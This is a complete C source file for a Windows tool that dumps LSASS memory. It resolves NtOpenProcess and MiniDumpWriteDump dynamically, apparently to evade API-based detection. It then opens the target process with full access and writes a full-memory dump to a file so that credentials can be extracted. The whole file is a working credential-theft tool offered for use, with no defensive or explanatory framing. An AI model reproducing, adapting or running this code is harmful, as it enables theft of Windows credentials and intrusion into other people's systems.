#include "structs.h"




int	main(int argc , char** argv) {

	if (argc != 3) {
		printf("[!] Usage: program.exe <PID2DUMP> <OUTPUT_FILENAME>\n");
		return -1;
	}

	HMODULE mod = LoadLibrary(L"Dbghelp.dll");
	if (!mod) {
		printf("[-] Module not found\n");
		return -1;
	}

	decNtDelayExecution delayExec = (decNtDelayExecution)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtDelayExecution");
	decNtOpenProcess ntopenProcess = (decNtOpenProcess)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtOpenProcess");
	procdump fnDumpMem = (procdump)GetProcAddress(mod, "MiniDumpWriteDump");

	if (!delayExec || !ntopenProcess || !fnDumpMem) {
		printf("[-] Failed the import of native apis\n");
		return -1;
	}

	printf("[+] Needed function resolved\n");	
	
	LPCSTR outputfilename = argv[2];
	DWORD pid = atoi(argv[1]);
	OBJECT_ATTRIBUTES objAttr;
	CLIENT_ID cID;
	InitializeObjectAttributes(&objAttr, NULL, 0, NULL, NULL);
	cID.UniqueProcess = (PVOID)pid;
	cID.UniqueThread = 0;
	HANDLE hProcess = NULL;

	ntopenProcess(&hProcess, PROCESS_ALL_ACCESS, &objAttr, &cID);
	
	if (!hProcess) {
		printf("[-] Failed getting handle to LSASS. Error: %lu\n", GetLastError());
		return -1;
	}

	printf("[+] Process Handle opened\n");

	
	HANDLE outputFile = CreateFileA(outputfilename, GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

	if (!outputFile) {
		printf("[-] Cannot write file. Error: %lu\n", GetLastError());
		return -1;
	}

	printf("[+] Output file created\n");


	BOOL dumped = fnDumpMem(hProcess, pid, outputFile, MiniDumpWithFullMemory, NULL, NULL, NULL);

	//BOOL dumped = MiniDumpWriteDump(hProcess, pid, outputFile, MiniDumpWithFullMemory, NULL, NULL, NULL);

	if (dumped != TRUE) {
		printf("[-] Failed to dump LSASS. Error: %lu\n", GetLastError());
		return -1;
	}
	
	printf("[+] Memory Dumped\n");

	printf("[!] Cleaning Up...\n");

	CloseHandle(outputFile);
	CloseHandle(hProcess);

	printf("[!] Done\n");

	return 0;
}